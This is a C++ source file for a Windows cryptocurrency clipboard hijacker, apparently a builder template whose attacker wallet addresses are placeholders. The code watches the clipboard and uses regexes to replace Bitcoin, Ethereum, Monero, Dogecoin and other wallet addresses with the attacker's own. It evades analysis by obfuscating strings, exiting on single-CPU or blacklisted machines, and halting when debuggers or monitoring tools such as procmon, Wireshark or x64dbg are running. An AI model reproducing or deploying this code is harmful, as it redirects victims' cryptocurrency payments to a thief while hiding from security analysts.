#include "common.h"
#include "obfuscateu.h"

#include <optional>
#include <regex>
#include <windows.h>
#include <vector>

#if DefAntiUsername
#include <algorithm>
#endif

#if DefAntiAnalysis
#include <thread>
#include <chrono>
#include <TlHelp32.h>
#endif

#if DefAntiUsername
std::string HashString(std::string input)
{
	HCRYPTPROV hCryptProv;
	HCRYPTHASH hHash;
	BYTE rgbHash[32];
	DWORD cbHash = 32;
	std::string result = "";
	if (!CryptAcquireContext(&hCryptProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return result;
	}
	if (!CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash)) {
		CryptReleaseContext(hCryptProv, 0);
		return result;
	}
	std::string inp = input;
	std::transform(inp.begin(), inp.end(), inp.begin(), ::tolower);
	if (!CryptHashData(hHash, (const BYTE*)inp.c_str(), inp.size(), 0)) {
		CryptDestroyHash(hHash);
		CryptReleaseContext(hCryptProv, 0);
		return result;
	}
	if (!CryptGetHashParam(hHash, HP_HASHVAL, rgbHash, &cbHash, 0)) {
		CryptDestroyHash(hHash);
		CryptReleaseContext(hCryptProv, 0);
		return result;
	}
	for (size_t i = 0; i < cbHash; i++) {
		result += std::to_string((int)rgbHash[i]);
	}
	CryptDestroyHash(hHash);
	CryptReleaseContext(hCryptProv, 0);
	return result;
}
#endif

#if DefAntiAnalysis
const wchar_t* szProcesses[] = {
	AYU_OBFW(L"ollydbg.exe"),
	AYU_OBFW(L"tcpview.exe"),
	AYU_OBFW(L"autoruns.exe"),
	AYU_OBFW(L"autorunsc.exe"),
	AYU_OBFW(L"filemon.exe"),
	AYU_OBFW(L"procmon.exe"),
	AYU_OBFW(L"regmon.exe"),
	AYU_OBFW(L"procexp.exe"),
	AYU_OBFW(L"idaq.exe"),
	AYU_OBFW(L"idaq64.exe"),
	AYU_OBFW(L"ImmunityDebugger.exe"),
	AYU_OBFW(L"Wireshark.exe"),
	AYU_OBFW(L"dumpcap.exe"),
	AYU_OBFW(L"HookExplorer.exe"),
	AYU_OBFW(L"ImportREC.exe"),
	AYU_OBFW(L"PETools.exe"),
	AYU_OBFW(L"LordPE.exe"),
	AYU_OBFW(L"SysInspector.exe"),
	AYU_OBFW(L"proc_analyzer.exe"),
	AYU_OBFW(L"sysAnalyzer.exe"),
	AYU_OBFW(L"sniff_hit.exe"),
	AYU_OBFW(L"windbg.exe"),
	AYU_OBFW(L"joeboxcontrol.exe"),
	AYU_OBFW(L"joeboxserver.exe"),
	AYU_OBFW(L"joeboxserver.exe"),
	AYU_OBFW(L"x32dbg.exe"),
	AYU_OBFW(L"x64dbg.exe"),
	AYU_OBFW(L"Fiddler.exe"),
	AYU_OBFW(L"httpdebugger.exe"),
	AYU_OBFW(L"frida-helper-32.exe"),
	AYU_OBFW(L"frida-helper-64.exe"),
};
DWORD GetProcessIdFromName(const wchar_t* szProcessName) {
	PROCESSENTRY32W pe32;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32W);

	if (!Process32FirstW(hSnapshot, &pe32)) {
		CloseHandle(hSnapshot);
		return 0;
	}

	if (_wcsicmp(pe32.szExeFile, szProcessName) == 0) {
		CloseHandle(hSnapshot);
		return pe32.th32ProcessID;
	}

	while (Process32NextW(hSnapshot, &pe32)) {
		if (_wcsicmp(pe32.szExeFile, szProcessName) == 0) {
			CloseHandle(hSnapshot);
			return pe32.th32ProcessID;
		}
	}

	CloseHandle(hSnapshot);
	return 0;
}
bool processFound = false;
void Search()
{
	while (true)
	{
		for (const auto& process : szProcesses)
		{
			if (GetProcessIdFromName(process))
			{
				processFound = true;
				break;
			}
		}
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}
}
#endif

std::optional<std::string> GetClipboardText() {
	if (auto data = GetClipboardData(CF_TEXT); data) {
		std::string text((char*)data);
		return text;
	}
	return std::nullopt;
}

int main(int argc, char *argv[])
{
    UNICODE_STRING ustring = init_unicode_string(AYU_OBFW(L"\\BaseNamedObjects\\#CLIPPERID"));
    OBJECT_ATTRIBUTES attr = { 0 };
    InitializeObjectAttributes(&attr, &ustring, 0, NULL, NULL);

    HANDLE hMutex;
    if (!NT_SUCCESS(UtCreateMutant(&hMutex, AYU_OBFC(MUTANT_ALL_ACCESS), &attr, TRUE))) {
        return 0;
    }

#if DefAntiUsername
	char username[1024 + 1];
	DWORD username_len = 1024 + 1;
	GetUserName(username, &username_len);
	std::string _username = HashString(username);
	std::vector<const char*> usernames = { #USERNAMELIST };
	for (int i = 0; i < usernames.size(); i++)
	{
		if (_stricmp(_username.c_str(), usernames[i]) == 0)
		{
			UtClose(hMutex);
			return 0;
		}
	}
	char computername[1024 + 1];
	DWORD computername_len = 1024 + 1;
	GetComputerName(computername, &computername_len);
	std::string _computername = HashString(computername);
	for (int i = 0; i < usernames.size(); i++)
	{
		if (_stricmp(_computername.c_str(), usernames[i]) == 0)
		{
			UtClose(hMutex);
			return 0;
		}
	}
#endif

#if DefAntiAnalysis
	PULONG ulNumberProcessors = (PULONG)(__readgsqword(0x60) + 0xB8);

	if (*ulNumberProcessors < 2)
	{
		UtClose(hMutex);
		return 0;
	}

	std::thread analysisThread(Search);
#endif

    LARGE_INTEGER sleeptime;
    sleeptime.QuadPart = -(AYU_OBFC(200 * 10000));

	std::vector<std::pair<std::regex, std::string>> regexList = {
#if DefClipBTC
		{std::regex("\\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}\\b"), "#BTCADDRESS"},
#endif
#if DefClipETH
		{std::regex("\\b0x[a-fA-F0-9]{40}\\b"), "#ETHADDRESS"},
#endif
#if DefClipLTC
		{std::regex("\\b[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}\\b"), "#LTCADDRESS"},
#endif
#if DefClipXMR
		{std::regex("\\b[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}\\b"), "#XMRADDRESS"},
#endif
#if DefClipBCH
		{std::regex("\\b((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}\\b"), "#BCHADDRESS"},
#endif
#if DefClipDOGE
		{std::regex("\\bD{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}\\b"), "#DOGEADDRESS"},
#endif
#if DefClipDASH
		{std::regex("\\bX[1-9A-HJ-NP-Za-km-z]{33}\\b"), "#DASHADDRESS"},
#endif
#if DefClipXLM
		{std::regex("\\bG[0-9a-zA-Z]{55}\\b"), "#XLMADDRESS"},
#endif
	};

	DWORD currentClipboard = 0;
	while (true)
	{
#if DefAntiAnalysis
		if (processFound) break;
#endif
		UtDelayExecution(FALSE, &sleeptime);
		if (currentClipboard == GetClipboardSequenceNumber() || !OpenClipboard(nullptr)) continue;
		auto clipboard = GetClipboardText();
		if ((!clipboard) || (clipboard->length() > 3000) || (clipboard->empty())) {
			currentClipboard = (DWORD)GetClipboardSequenceNumber();
			CloseClipboard();
			continue;
		}
		std::string newClipboard = *clipboard;
		for (auto& regex : regexList) {
			if (regex.second.empty()) continue;
			newClipboard = std::regex_replace(newClipboard, regex.first, regex.second);
			if (newClipboard != *clipboard) {
				auto glob = GlobalAlloc(GMEM_FIXED, newClipboard.length() + 1);
				if (glob) {
					memcpy(glob, newClipboard.c_str(), newClipboard.length() + 1);
					EmptyClipboard();
					SetClipboardData(CF_TEXT, glob);
				}
				break;
			}
		}
		currentClipboard = (DWORD)GetClipboardSequenceNumber();
		CloseClipboard();
	}

    UtClose(hMutex);
	return 0;
} 